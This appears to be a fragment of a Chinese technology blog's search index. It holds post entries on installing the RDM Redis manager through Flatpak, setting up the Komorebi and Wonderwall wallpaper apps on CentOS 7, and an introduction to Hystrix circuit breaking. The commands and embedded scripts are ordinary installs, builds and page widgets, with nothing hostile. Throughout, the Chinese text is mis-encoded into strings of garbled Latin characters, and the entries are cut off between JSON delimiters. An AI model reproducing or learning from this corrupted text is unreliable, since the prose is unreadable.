RDMé™¤äº†ä¸Šé¢ä»‹ç»çš„å¯ä»¥é€šè¿‡ Snap å®‰è£… RDM ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡ Flatpak æ¥å®‰è£…ï¼Œå…¶ä¼˜åŠ¿å’Œ Snap ä¸€æ ·ã€‚æ­¤å®‰è£…æ–¹å¼é€‚ç”¨äº CentOSã€Debianã€Ubuntu ç­‰ Linux å‘è¡Œç‰ˆï¼ŒFlatpak çš„å®‰è£…å’Œä½¿ç”¨å¯å‚è€ƒæœ¬ç«™æ•™ç¨‹ã€‚ 12345678910# å®‰è£…# flatpak install flathub dev.rdm.RDM# æŸ¥çœ‹å®‰è£…çŠ¶æ€# flatpak list# ä½¿ç”¨å‘½ä»¤æ¥å¯åŠ¨ï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·æƒé™ï¼‰$ flatpak run dev.rdm.RDM# æˆ–è€…èœå•æ å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; ç¼–ç¨‹ --&gt; RDMï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼æ¥å¯åŠ¨åº”ç”¨ RDM ä¸»ç•Œé¢å›¾ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux å¼€å‘å·¥å…·"},{title:"Centos7 å®‰è£…å£çº¸åº”ç”¨",url:"/posts/5ffc3398.html",text:'å‰è¨€ æœ¬æ–‡ä¸»è¦ä»‹ç»ä¸¤æ¬¾é€‚ç”¨äº Centos7 çš„æ¡Œé¢å£çº¸åº”ç”¨ï¼Œåˆ†åˆ«æ˜¯ Komorebi å’Œ Wonderwallï¼Œå…¶ä¸­ Komoreb æ”¯æŒä½¿ç”¨è§†é¢‘ã€ç½‘é¡µä½œä¸ºæ¡Œé¢åŠ¨æ€å£çº¸ã€‚ ç³»ç»Ÿç¯å¢ƒ 12CentOS Linux release 7.6.1810 (Core)Linux centos7.6 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux Komorebi ç«™ç‚¹ Komorebi Github Komorebi Releases Komorebi Centos Github Komorebi Centos Releases Ubuntu å®‰è£…åŠ¨æ€å£çº¸åº”ç”¨ Komorebi Komorebi ä»‹ç» Komorebi æ˜¯ä¸€æ¬¾ Linux åŠ¨æ€å£çº¸åº”ç”¨ï¼Œå¯ä»¥å®ç°ç±»ä¼¼ Stream Wallpaper Engine çš„æ•ˆæœï¼Œæ”¯æŒä½¿ç”¨å›¾ç‰‡ã€è§†é¢‘ã€ç½‘é¡µä½œä¸ºæ¡Œé¢å£çº¸ã€‚Komorebi å®˜æ–¹é»˜è®¤åªæ”¯æŒ Debian/Ubuntu ç³»çš„ Linux å‘è¡Œç‰ˆï¼Œå¦‚æœéœ€è¦åœ¨ Centos7 ä¸Šå®‰è£…ï¼Œåˆ™éœ€è¦ç¼–è¯‘åˆ†æ”¯ Komorebi-Centos çš„ä»£ç ï¼Œæ‰‹åŠ¨å®‰è£…ç¼–è¯‘æ„å»ºç”Ÿæˆçš„ RPM åŒ…ã€‚ Komorebi å®‰è£… 12345678910111213141516171819202122232425262728293031# å®‰è£…ä¾èµ–# yum install devtoolset-6 clutter* libgee-devel webkitgtk-devel.x86_64 webkitgtk4-devel.x86_64 vala-devel cmake3 gtk3-devel# yum install https://github.com/c4pt000/komorebi-centos/releases/download/gstreamer-libav/gstreamer1-libav-1.0.6-1.el7.nux.x86_64.rpm# åˆ‡æ¢sclç‰ˆæœ¬çš„bashç¯å¢ƒ# scl enable devtoolset-6 bash# è¿›å…¥å®‰è£…ç›®å½•# /usr/local# ä¸‹è½½æºç # git clone https://github.com/c4pt000/komorebi-centos# å‡†å¤‡å·¥ä½œ# cd komorebi-centos# cp -rf CMakeLists.txt CMakeLists.txt.deb# cp -rf CMakeLists.txt.rpm CMakeLists.txt# åˆ›å»ºæ„å»ºç›®å½•# mkdir build# cd build# ç¼–è¯‘ç”ŸæˆrpmåŒ…# cmake3 ..# make -j16 package# å®‰è£…komorebi# rpm -ivh komorebi-2.1.0-Linux.rpm# é€€å‡ºsclç‰ˆæœ¬çš„bashç¯å¢ƒ# exit Komorebi å¼€æœºè‡ªåŠ¨è¿è¡Œ ä¸Šè¿°å®‰è£…æ­¥éª¤æˆåŠŸæ‰§è¡Œåï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº â€“&gt; ç³»ç»Ÿå·¥å…· â€“&gt; Komorebiï¼Œç‚¹å‡»å¿«æ·æ–¹å¼è¿è¡Œåº”ç”¨åï¼Œæ¡Œé¢çš„å£çº¸ä¼šè‡ªåŠ¨åˆ‡æ¢ã€‚æ­¤æ—¶å³å‡»æ¡Œé¢ï¼Œå¯ä»¥é…ç½® Komorebi å’Œé€‰æ‹©å®˜æ–¹çš„å…¶ä»–å›¾ç‰‡å£çº¸ã€‚å¦‚æœéœ€è¦ Komorebi å¼€æœºè‡ªå¯åŠ¨ï¼Œå¯ä»¥å¯¼èˆªåˆ°åº”ç”¨ç¨‹åº â€“&gt; é™„ä»¶ â€“&gt; ä¼˜åŒ–å·¥å…· â€“&gt; å¼€æœºå¯åŠ¨ç¨‹åºï¼Œæ‰‹åŠ¨æ·»åŠ  Komorebi ä¸ºå¼€æœºè‡ªå¯åŠ¨å³å¯ã€‚ (adsbygoogle = window.adsbygoogle || []).push({}); Komorebi è‡ªå®šä¹‰å£çº¸ Komorebi æ”¯æŒä½¿ç”¨è‡ªå®šä¹‰å›¾ç‰‡å’Œ MP4 è§†é¢‘ä½œä¸ºæ¡Œé¢å£çº¸ï¼Œå®˜æ–¹æä¾›äº†å£çº¸åˆ¶ä½œå·¥å…·ï¼Œå¯¼èˆªåˆ°åº”ç”¨ç¨‹åº â€“&gt; ç³»ç»Ÿå·¥å…· â€“&gt; Wallpaper Creatorï¼Œè¿è¡Œåº”ç”¨åå¯ä»¥åˆ›å»ºè‡ªå®šä¹‰çš„ Komorebi å£çº¸ã€‚é™æ€å£çº¸çš„åˆ¶ä½œæ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œé‡ç‚¹ä»‹ç»åŠ¨æ€å£çº¸çš„åˆ¶ä½œï¼Œå…·ä½“å¯å‚è€ƒä»¥ä¸‹æ•™ç¨‹æˆ–è€…å®˜æ–¹çš„åŠ¨æ€å£çº¸åˆ¶ä½œæ•™ç¨‹ã€‚ 1234567891011121314151617181920212223242526# åˆ¶ä½œåŠ¨æ€å£çº¸ï¼Œæœ€é‡è¦çš„æ˜¯éœ€è¦é¢„å…ˆå°†è§†é¢‘æ–‡ä»¶è½¬æ¢å›¾ç‰‡æ–‡ä»¶# å®‰è£…ä¾èµ–# yum install libjpeg libjpeg-devel libpng libpng-devel libtiff libtiff-devel libungif libungif-devel freetype zlib# å®‰è£…ImageMagick# yum install ImageMagick# å®‰è£…ffmpeg# yum install ffmpeg ffmpegthumbnailer# å°†mp4æ–‡ä»¶è½¬æ¢æˆå›¾ç‰‡æ–‡ä»¶# ffmpeg -i redial-video.mp4 -ss 00:00:01.000 -vframes 1 thumbnail.png# è¿è¡Œ"Wallpaper Creator"åº”ç”¨æ¥åˆ›å»ºæ¡Œé¢å£çº¸ï¼Œæ ¹æ®ç•Œé¢æç¤ºé€‰æ‹©ä¸Šé¢çš„redial-video.mp4æ–‡ä»¶ä¸thumbnail.pngæ–‡ä»¶ï¼Œç„¶åç”Ÿæˆkomorebiçš„å£çº¸èµ„æºç›®å½•ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š# æœ€ç»ˆç”Ÿæˆçš„komorebiå£çº¸èµ„æºç›®å½•ç»“æ„redial-videoâ”œâ”€â”€ configâ”œâ”€â”€ redial-video.mp4â””â”€â”€ wallpaper.jpg# æ‹·è´å£çº¸èµ„æºæ–‡ä»¶# cp -r redial-video /System/Resources/Komorebi/# è¿è¡Œkomorebiåï¼Œå³å‡»æ¡Œé¢æ‰“å¼€komorebiçš„é…ç½®ç•Œé¢ï¼Œå…ˆå‹¾é€‰"Enable Video Wallpapers"ï¼Œç„¶åé€‰æ‹©ä¸Šé¢åˆ›å»ºçš„åŠ¨æ€å£çº¸å³å¯ Wonderwall ä»‹ç» Wonderwall æ˜¯ä¸€æ¬¾é…·ç‚«çš„å£çº¸ç¨‹åºï¼Œå¯è¿è¡Œåœ¨ Linux ç³»ç»Ÿçš„ Unity å’Œ GNOME æ¡Œé¢ç¯å¢ƒä¸­ã€‚Wonderwall æä¾›äº†é«˜åˆ†è¾¨ç‡å£çº¸ï¼Œéå¸¸é€‚åˆå¸‚åœºä¸Šæµè¡Œçš„å®½å±æ˜¾ç¤ºå™¨ï¼Œä½†ä¸æ”¯æŒåŠ¨æ€å£çº¸åŠŸèƒ½ã€‚å¦‚æœä½ ä¸éœ€è¦åŠ¨æ€å£çº¸çš„åŠŸèƒ½ï¼Œå¹¶æŠ±æ€¨ Komorebi ä¸èƒ½åœ¨çº¿ä¸‹è½½å£çº¸ï¼Œé‚£ä¹ˆ Wonderwall éå¸¸é€‚åˆä½ ã€‚ç›®å‰æ²¡æœ‰å¯ç”¨çš„ YUM æºï¼Œä½†å¯ä»¥ä½¿ç”¨ Snap ç›´æ¥å®‰è£… Wonderwallï¼ŒSnap çš„å®‰è£…å¯å‚è€ƒæœ¬ç«™æ•™ç¨‹ã€‚Wonderwall æ‹¥æœ‰ä¸‹åˆ—å¼ºå¤§çš„åŠŸèƒ½ï¼š æ”¯æŒåˆ†ç±»ä¸‹è½½å£çº¸ æ‹¥æœ‰å…¨çƒæœ€å¤§çš„åœ¨çº¿ 4k å’Œè¶…é«˜æ¸…å£çº¸é›† æ”¯æŒè£å‰ª / ç¼©æ”¾ä¸‹è½½çš„å¢™çº¸ï¼Œä½¿å…¶é€‚åˆå„ç§çš„å±å¹•åˆ†è¾¨ç‡ å…·æœ‰å¼ºå¤§çš„å£çº¸æœç´¢è¿‡æ»¤å·¥å…·ï¼Œæ”¯æŒä½¿ç”¨é¢œè‰²ï¼Œæ ‡ç­¾ï¼Œç±»åˆ«ï¼Œåˆ†è¾¨ç‡ï¼Œå—æ¬¢è¿ç¨‹åº¦ï¼Œè§‚çœ‹æ¬¡æ•°ï¼Œè¯„åˆ†ç­‰æœç´¢å¢™çº¸ Wonderwall å®‰è£… 12345678910111213141516# å®‰è£…# snap install wonderwall# åˆ›å»ºå¿«æ·æ–¹å¼# vim /usr/share/applications/wonderwall.desktop[Desktop Entry]Version=1.0GenericName=WonderwallName=WonderwallType=ApplicationIcon=/var/lib/snapd/snap/wonderwall/current/meta/gui/icon.pngKeywords=Wallpaper;Variety;wallch;desktop;backgroundExec=/snap/bin/wonderwall %FCategories=GNOME;System;Terminal=falseName[en_IN]=Wonderwall Wonderwall è¿è¡Œ 123456# å¯¼èˆªåˆ°ï¼šåº”ç”¨ç¨‹åº --&gt; ç³»ç»Ÿå·¥å…· --&gt; Wonderwallï¼Œç›´æ¥ç‚¹å‡»å¿«æ·æ–¹å¼å¯åŠ¨åº”ç”¨ï¼Œåº”ç”¨å¯åŠ¨åçš„æ•ˆæœå›¾å¦‚ä¸‹# æˆ–è€…ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼ˆä½¿ç”¨æ™®é€šç”¨æˆ·æƒé™ï¼‰$ /snap/bin/wonderwall# æç¤ºï¼ŒWonderwallä¸‹è½½å£çº¸åçš„é»˜è®¤å­˜æ”¾ç›®å½•ä¸ºï¼š~/snap/wonderwall/current/.local/share/ktechpit/WonderWall/download GNOME Shell çš„å£çº¸åº”ç”¨æ‰©å±• Google Earth Wallpaper Bing Wallpaper Changer NASA APOD Wallpaper Changer var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Hystrix å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/2ed0fea6.html",text:'æœåŠ¡é›ªå´©æ•ˆåº”æœåŠ¡é›ªå´©æ¦‚è¿°å¾®æœåŠ¡ä¹‹é—´è¿›è¡Œ RPC æˆ–è€… HTTP è°ƒç”¨æ—¶ï¼Œä¸€èˆ¬éƒ½ä¼šè®¾ç½® è°ƒç”¨è¶…æ—¶ï¼Œå¤±è´¥é‡è¯•ç­‰æœºåˆ¶æ¥ç¡®ä¿æœåŠ¡çš„æˆåŠŸæ‰§è¡Œï¼Œè¿™çœ‹ä¸Šå»å¾ˆç¾å¥½ï¼Œä½†å¦‚æœä¸è€ƒè™‘æœåŠ¡çš„ç†”æ–­å’Œé™æµï¼Œå®ƒå°±æ˜¯é€ æˆæœåŠ¡é›ªå´©çš„å…ƒå‡¶ã€‚å‡è®¾æœ‰ä¸¤ä¸ªè®¿é—®é‡æ¯”è¾ƒå¤§çš„æœåŠ¡ A å’Œ Bï¼Œè¿™ä¸¤ä¸ªæœåŠ¡åˆ†åˆ«ä¾èµ– C å’Œ Dï¼Œå…¶ä¸­ C å’Œ D æœåŠ¡éƒ½ä¾èµ– E æœåŠ¡ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„æ‰‡å‡ºã€‚A å’Œ B ä¸æ–­åœ°è°ƒç”¨ C å’Œ Dï¼Œå¤„ç†å®¢æˆ·è¯·æ±‚å’Œè¿”å›éœ€è¦çš„æ•°æ®ï¼›å½“ E æœåŠ¡ä¸èƒ½æä¾›æœåŠ¡çš„æ—¶å€™ï¼ŒC å’Œ D çš„ è¶…æ—¶å’Œé‡è¯•æœºåˆ¶ä¼šè¢«æ‰§è¡Œï¼›ç”±äºæ–°çš„è¯·æ±‚ä¸æ–­çš„äº§ç”Ÿï¼Œä¼šå¯¼è‡´ C å’Œ D å¯¹ E æœåŠ¡çš„è°ƒç”¨å¤§é‡çš„ç§¯å‹ï¼Œäº§ç”Ÿå¤§é‡çš„è°ƒç”¨ç­‰å¾…å’Œé‡è¯•è°ƒç”¨ï¼Œä¼šæ…¢æ…¢è€—å°½ C å’Œ D çš„ç³»ç»Ÿèµ„æºï¼ˆCPU æˆ–è€…å†…å­˜ç­‰ï¼‰ï¼Œç„¶å C å’Œ D æœåŠ¡è·Ÿç€ä¹Ÿ down æ‰ã€‚A å’Œ B æœåŠ¡ä¼šé‡å¤ C å’Œ D çš„é­é‡ï¼Œå¯¼è‡´ç³»ç»Ÿèµ„æºè€—å°½ï¼Œç„¶åæœåŠ¡ä¹Ÿ down æ‰äº†ï¼Œæœ€ç»ˆæ•´ä¸ªæœåŠ¡éƒ½ä¸å¯è®¿é—®ï¼Œé€ æˆäº†æœåŠ¡é›ªå´©ã€‚ æœåŠ¡é›ªå´©åŸå› åˆ†æ è®¿é—®é‡çš„çªç„¶æ¿€å¢ ç¡¬ä»¶æ•…éšœï¼Œå¦‚æœºå™¨å®•æœºï¼Œæœºæˆ¿æ–­ç”µï¼Œå…‰çº¤è¢«æŒ–æ–­ç­‰ æ•°æ®åº“å­˜åœ¨ä¸¥é‡ç“¶é¢ˆï¼Œå¦‚ï¼šé•¿äº‹åŠ¡ã€SQL æŸ¥è¯¢è¶…æ—¶ç­‰ ç¼“å­˜å‡»ç©¿ï¼Œå¯¼è‡´è¯·æ±‚å…¨éƒ¨è½åˆ°æŸä¸ªæœåŠ¡ï¼Œå¯¼è‡´æœåŠ¡å®•æ‰ ç¨‹åºæœ‰ Bugï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨æˆ–è€…è¿è¡Œç¼“æ…¢ï¼Œå¦‚å†…å­˜æ³„æ¼ã€çº¿ç¨‹åŒæ­¥ç­‰å¾…ç­‰ æœåŠ¡é›ªå´©è§£å†³æ–¹æ¡ˆ éš”ç¦»ï¼šå°†ä¸åŒç±»å‹çš„æ¥å£éš”ç¦»éƒ¨ç½²ï¼Œå•ä¸ªç±»å‹æ¥å£çš„å¤±è´¥ç”šè‡³è¿›ç¨‹æ± è¢«è€—å°½äº†ï¼Œä¹Ÿä¸ä¼šå½±å“å…¶ä»–æ¥å£çš„æ­£å¸¸è®¿é—® é™æµï¼šå½“å‘ç°æœåŠ¡å¤±è´¥æ•°é‡è¾¾åˆ°æŸä¸ªé˜ˆå€¼ï¼Œæ‹’ç»è®¿é—®ï¼Œä»¥æ­¤é™åˆ¶æ›´å¤šæµé‡è¿›æ¥ï¼Œé˜²æ­¢è¿‡å¤šå¤±è´¥çš„è¯·æ±‚å°†èµ„æºè€—å°½ ç†”æ–­ï¼šä»æ¥å£è¯·æ±‚è¿æ¥æ—¶å°±æ‹’ç»è®¿é—®ï¼Œç±»ä¼¼å®¶é‡Œç”¨çš„ä¿é™©ä¸ï¼Œå½“ä½¿ç”¨çš„ç”µå™¨æ€»å’Œè¶…è¿‡äº†ç”µå‹å°±ç†”æ–­ä¿é™©ä¸ï¼Œä¿æŠ¤æ•´ä¸ªåŒºåŸŸçš„ç”µè·¯é˜²æ­¢æ›´å¤šçš„æŸå¤± é™çº§ï¼šå¯¹äºç®€å•çš„å±•ç¤ºåŠŸèƒ½ï¼Œå¦‚æœæœ‰å¤±è´¥çš„è¯·æ±‚ï¼Œè¿”å›é»˜è®¤å€¼ï¼›å¯¹äºæ•´ä¸ªç«™ç‚¹æˆ–å®¢æˆ·ç«¯ï¼Œå¦‚æœæœåŠ¡å™¨è´Ÿè½½è¿‡é«˜ï¼Œåˆ™å°†å…¶ä»–éæ ¸å¿ƒä¸šåŠ¡åœæ‰ï¼Œä»¥è®©å‡ºæ›´å¤šèµ„æºç»™å…¶ä»–æœåŠ¡ä½¿ç”¨ ç†”æ–­ä¸é™çº§çš„åŒºåˆ«ç†”æ–­ä¸é™çº§çš„ç›¸åŒç‚¹ï¼š æœ€ç»ˆè¡¨ç°ç±»ä¼¼ï¼Œå¯¹äºä¸¤è€…æ¥è¯´ï¼Œæœ€ç»ˆè®©ç”¨æˆ·ä½“éªŒåˆ°çš„æ˜¯æŸäº›åŠŸèƒ½æš‚æ—¶ä¸å¯è¾¾æˆ–ä¸å¯ç”¨ ç›®çš„å¾ˆä¸€è‡´ï¼Œéƒ½æ˜¯ä»å¯ç”¨æ€§å¯é æ€§ç€æƒ³ï¼Œä¸ºé˜²æ­¢ç³»ç»Ÿçš„æ•´ä½“ç¼“æ…¢ç”šè‡³å´©æºƒè€Œé‡‡ç”¨çš„æŠ€æœ¯æ‰‹æ®µ ç²’åº¦ä¸€èˆ¬éƒ½æ˜¯æœåŠ¡çº§åˆ«ï¼Œå½“ç„¶ï¼Œä¸šç•Œä¹Ÿæœ‰ä¸å°‘æ›´ç»†ç²’åº¦çš„åšæ³•ï¼Œæ¯”å¦‚åšåˆ°æ•°æ®æŒä¹…å±‚ï¼ˆå…è®¸æŸ¥è¯¢ï¼Œä¸å…è®¸å¢åˆ æ”¹ï¼‰ è‡ªæ²»æ€§è¦æ±‚å¾ˆé«˜ï¼Œç†”æ–­æ¨¡å¼ä¸€èˆ¬éƒ½æ˜¯æœåŠ¡åŸºäºç­–ç•¥çš„è‡ªåŠ¨è§¦å‘ï¼Œé™çº§è™½è¯´å¯äººå·¥å¹²é¢„ï¼Œä½†åœ¨å¾®æœåŠ¡æ¶æ„ä¸‹ï¼Œå®Œå…¨é äººæ˜¾ç„¶ä¸å¯èƒ½ï¼Œå¼€å…³é¢„ç½®ã€é…ç½®ä¸­å¿ƒéƒ½æ˜¯å¿…è¦æ‰‹æ®µ ç†”æ–­ä¸é™çº§çš„ä¸åŒç‚¹ï¼š å®ç°æ–¹å¼ä¸å¤ªä¸€æ ·ï¼Œé™çº§å…·æœ‰ä»£ç ä¾µå…¥æ€§ (ç”±æ§åˆ¶å™¨å®Œæˆæˆ–è€…è‡ªåŠ¨é™çº§)ï¼Œç†”æ–­ä¸€èˆ¬ç§°ä¸ºè‡ªæˆ‘ç†”æ–­ è§¦å‘åŸå› ä¸å¤ªä¸€æ ·ï¼ŒæœåŠ¡ç†”æ–­ä¸€èˆ¬æ˜¯æŸä¸ªæœåŠ¡ï¼ˆä¸‹æ¸¸æœåŠ¡ï¼‰æ•…éšœå¼•èµ·ï¼Œè€ŒæœåŠ¡é™çº§ä¸€èˆ¬æ˜¯ä»æ•´ä½“è´Ÿè·è€ƒè™‘ ç®¡ç†ç›®æ ‡çš„å±‚æ¬¡ä¸å¤ªä¸€æ ·ï¼Œç†”æ–­å…¶å®æ˜¯ä¸€ä¸ªæ¡†æ¶çº§çš„å¤„ç†ï¼Œæ¯ä¸ªå¾®æœåŠ¡éƒ½éœ€è¦ï¼ˆæ— å±‚çº§ä¹‹åˆ†ï¼‰ï¼Œè€Œé™çº§ä¸€èˆ¬éœ€è¦å¯¹ä¸šåŠ¡æœ‰å±‚çº§ä¹‹åˆ†ï¼ˆæ¯”å¦‚é™çº§ä¸€èˆ¬æ˜¯ä»æœ€å¤–å›´æœåŠ¡å¼€å§‹ï¼‰ èµ„æºéš”ç¦»çš„çº§åˆ« åº”ç”¨çº§åˆ«éš”ç¦»ï¼šçº¿ç¨‹æ± éš”ç¦»ã€ä¿¡å·é‡éš”ç¦»ã€è¿æ¥æ± éš”ç¦»ï¼›Hystrix å®ç°äº†å‰ä¸¤ç§ï¼Œå…¶å„è‡ªä¼˜ç¼ºç‚¹å¦‚ä¸‹å›¾ï¼š ç¡¬ä»¶çº§åˆ«éš”ç¦»ï¼šè™šæ‹Ÿæœºã€Dockerï¼Œæ¯”å¦‚ Docker çš„èµ„æºéš”ç¦»å’Œèµ„æºé™åˆ¶ï¼Œå…¶é€šè¿‡ CGroup æ¥æ§åˆ¶å®¹å™¨ä½¿ç”¨çš„èµ„æºé…é¢ï¼ŒåŒ…æ‹¬ CPUã€å†…å­˜ã€ç£ç›˜ IOã€ç½‘ç»œ Hystrix ä»‹ç»Hystrix æ˜¯ä»€ä¹ˆHystrix æ˜¯ç”± Netflix å¼€æºçš„ä¸€ä¸ªé’ˆå¯¹åˆ†å¸ƒå¼ç³»ç»Ÿå®¹é”™å¤„ç†çš„å¼€æºç»„ä»¶ï¼Œ2011 - 2012 å¹´ç›¸ç»§è¯ç”Ÿå’Œæˆç†Ÿï¼Œåœ¨ 2018 å¹´ 11 æœˆ 20 æ—¥ä¹‹åå·²ç»åœæ­¢ç»´æŠ¤ï¼Œæœ€åä¸€ä¸ªæ­£å¼ç‰ˆæœ¬ä¸º 1.5.18ã€‚Hystrix å•è¯æ„ä¸º â€œè±ªçŒªâ€ï¼Œæµ‘èº«æœ‰åˆºä¿æŠ¤è‡ªå·±ï¼ŒHystrix å°±æ˜¯è¿™æ ·ä¸€ä¸ªç”¨æ¥æå«åº”ç”¨ç¨‹åºå¥åº·çš„åˆ©å™¨ã€‚è¿›ä¸€æ­¥è¯´ï¼ŒHystrix æ˜¯ä¸€ä¸ªå»¶è¿Ÿå’Œå®¹é”™åº“ï¼Œç”¨åœ¨éš”ç¦»è¿œç¨‹ç³»ç»Ÿã€æœåŠ¡å’Œç¬¬ä¸‰æ–¹åº“ï¼Œé˜»æ­¢çº§è¿æ•…éšœï¼Œåœ¨å¤æ‚çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å®ç°æ¢å¤èƒ½åŠ›ï¼Œä»¥æé«˜åˆ†å¸ƒå¼ç³»ç»Ÿçš„å¼¹æ€§ã€‚Hystrix åº•å±‚å¤§é‡ä½¿ç”¨äº† RxJavaï¼Œè€Œ Spring Cloud Hystrix å¯¹ Hystrix è¿›è¡Œäº†äºŒæ¬¡å°è£…ï¼Œå°†å…¶æ•´åˆè¿› Spring Cloud ç”Ÿæ€ï¼Œæ›´å¤šä»‹ç»å¯å‚è€ƒï¼šHystrix é¡¹ç›®ã€Hystrix å®˜æ–¹è‹±æ–‡æ•™ç¨‹ã€Spring Cloud Hystrix å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Hystrix çš„è®¾è®¡ç›®æ ‡ é€šè¿‡å®¢æˆ·ç«¯åº“å¯¹å»¶è¿Ÿå’Œæ•…éšœè¿›è¡Œä¿æŠ¤å’Œæ§åˆ¶ åœ¨ä¸€ä¸ªå¤æ‚çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­åœæ­¢çº§è”æ•…éšœ å¿«é€Ÿå¤±è´¥å’Œè¿…é€Ÿæ¢å¤ åœ¨åˆç†çš„æƒ…å†µä¸‹å›é€€å’Œä¼˜é›…åœ°é™çº§ å¼€å¯è¿‘å®æ—¶ç›‘æ§ã€å‘Šè­¦å’Œæ“ä½œæ§åˆ¶ Hystrix çš„ç‰¹æ€§æœåŠ¡ç†”æ–­ç†”æ–­æœºåˆ¶æ˜¯åº”å¯¹æœåŠ¡é›ªå´©æ•ˆåº”çš„ä¸€ç§å¾®æœåŠ¡é“¾è·¯ä¿æŠ¤æœºåˆ¶ã€‚æ—¥å¸¸åœ¨å„ç§åœºæ™¯ä¸‹éƒ½ä¼šæ¥è§¦åˆ°ç†”æ–­è¿™ä¸¤ä¸ªå­—ï¼Œé«˜å‹ç”µè·¯ä¸­ï¼Œå¦‚æœæŸä¸ªåœ°æ–¹çš„ç”µå‹è¿‡é«˜ï¼Œç†”æ–­å™¨å°±ä¼šç†”æ–­ï¼Œå¯¹ç”µè·¯è¿›è¡Œä¿æŠ¤ã€‚è‚¡ç¥¨äº¤æ˜“ä¸­ï¼Œå¦‚æœè‚¡ç¥¨æŒ‡æ•°è¿‡é«˜ï¼Œä¹Ÿä¼šé‡‡ç”¨ç†”æ–­æœºåˆ¶ï¼Œæš‚åœè‚¡ç¥¨çš„äº¤æ˜“ã€‚åŒæ ·ï¼Œåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œç†”æ–­æœºåˆ¶ä¹Ÿæ˜¯èµ·ç€ç±»ä¼¼çš„ä½œç”¨ã€‚å½“æ‰‡å‡ºé“¾è·¯çš„æŸä¸ªå¾®æœåŠ¡ä¸å¯ç”¨æˆ–è€…å“åº”æ—¶é—´å¤ªé•¿æ—¶ï¼Œä¼šè¿›è¡ŒæœåŠ¡çš„é™çº§ï¼Œè¿›è€Œç†”æ–­è¯¥èŠ‚ç‚¹å¾®æœåŠ¡çš„è°ƒç”¨ï¼Œå¿«é€Ÿè¿”å›â€ é”™è¯¯â€ çš„å“åº”ä¿¡æ¯ã€‚å½“æ£€æµ‹åˆ°è¯¥èŠ‚ç‚¹å¾®æœåŠ¡è°ƒç”¨å“åº”æ­£å¸¸åæ¢å¤è°ƒç”¨é“¾è·¯ã€‚åœ¨ Spring Cloud æ¡†æ¶é‡Œç†”æ–­æœºåˆ¶é€šè¿‡ Hystrix å®ç°ï¼ŒHystrix ä¼šç›‘æ§å¾®æœåŠ¡é—´è°ƒç”¨çš„çŠ¶å†µï¼Œå½“å¤±è´¥çš„è°ƒç”¨åˆ°ä¸€å®šé˜ˆå€¼ï¼Œç¼ºçœæ˜¯ 5 ç§’å†… 20 æ¬¡è°ƒç”¨å¤±è´¥å°±ä¼šå¯åŠ¨ç†”æ–­æœºåˆ¶ã€‚æœåŠ¡ç†”æ–­æ˜¯åœ¨æœåŠ¡ç«¯ï¼ˆæœåŠ¡æä¾›è€…ï¼‰å®ç°çš„ï¼ŒHybstrix ç†”æ–­æœºåˆ¶çš„æ³¨è§£æ˜¯ @HystrixCommandã€‚ æœåŠ¡é™çº§æœåŠ¡å‹åŠ›å‰§å¢çš„æ—¶å€™ï¼Œæ ¹æ®å½“å‰çš„ä¸šåŠ¡æƒ…å†µåŠæµé‡å¯¹ä¸€äº›æœåŠ¡å’Œé¡µé¢æœ‰ç­–ç•¥çš„é™çº§ï¼Œç¼“è§£æœåŠ¡å™¨çš„å‹åŠ›ï¼Œä»¥ä¿è¯æ ¸å¿ƒä»»åŠ¡çš„è¿›è¡Œï¼ŒåŒæ—¶ä¿è¯éƒ¨åˆ†ç”šè‡³å¤§éƒ¨åˆ†è¯·æ±‚èƒ½å¾—åˆ°æ­£ç¡®çš„å“åº”ã€‚ä¹Ÿå°±æ˜¯å½“å‰çš„è¯·æ±‚å¤„ç†ä¸äº†æˆ–è€…å‡ºé”™äº†ï¼Œç»™ä¸€ä¸ªé»˜è®¤çš„è¿”å›ç»“æœã€‚æœåŠ¡é™çº§å¤„ç†æ˜¯åœ¨å®¢æˆ·ç«¯ï¼ˆæœåŠ¡æ¶ˆè´¹è€…ï¼‰å®ç°çš„ï¼Œä¸æœåŠ¡ç«¯ï¼ˆæœåŠ¡æä¾›è€…ï¼‰æ²¡æœ‰å…³ç³»ã€‚ 